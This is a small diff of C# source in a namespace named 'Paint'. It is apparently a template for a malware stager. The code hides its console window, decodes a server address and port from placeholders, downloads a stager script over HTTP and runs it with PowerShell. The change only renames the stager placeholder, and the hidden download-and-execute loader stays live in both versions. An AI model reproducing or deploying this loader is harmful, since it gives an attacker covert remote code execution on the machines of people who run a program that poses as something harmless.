@@ -20,7 +20,7 @@ namespace Paint
 		ShowWindow(Console, 0);
 
 		WebClient client = new WebClient();
-		String code = client.DownloadString(dec("{http}")+dec("{ip}")+":"+dec("{port}")+dec("{b52_stager}"));
+		String code = client.DownloadString(dec("{http}")+dec("{ip}")+":"+dec("{port}")+dec("{b64_stager}"));
 		PowerShell ps = PowerShell.Create();
 		ps.AddScript(code);
 		ps.Invoke();
